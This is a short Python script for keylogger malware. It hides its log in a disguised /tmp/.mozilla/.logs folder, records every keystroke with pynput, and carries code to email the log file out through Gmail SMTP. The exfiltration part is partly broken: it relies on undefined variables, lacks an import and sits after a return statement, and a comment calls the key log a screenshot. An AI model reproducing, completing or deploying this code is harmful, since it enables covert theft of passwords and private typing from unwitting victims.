#!/usr/bin/python3
import os

def keystrokes():
    import logging, pynput
    from pynput.keyboard import Key, Listener
    
    #where the log files is stored
    #log_dir = r"C:/users/username/desktop/"
    os.mkdir('/tmp/.mozilla/.logs')
    log_dir = "/tmp/.mozilla/.logs/"

    logging.basicConfig(filename= (log_dir + "key_log.txt"), level=logging.DEBUG, format='["%(asctime)s", %(message)s]') 

    def on_press(key):
        #logging.info('"{0}"'.format(key))
        logging.info(key)

    with Listener(on_press=on_press) as listener:
        listener.join()
        
    time.sleep(30)
    return

    # sending the screenshot
    body1 = 'This is the log file of the keys pressed!'
    msg.attach(MIMEText(body1,'plain'))

    filename='/tmp/.mozilla/.logs/key_log.txt'
    attachment  =open(filename,'rb')

    part = MIMEBase('application','octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition',"attachment; filename= "+filename)

    msg.attach(part)
    text = msg.as_string()
    server = smtplib.SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(email_user,email_password)


    server.sendmail(email_user,email_send,text)
    server.quit()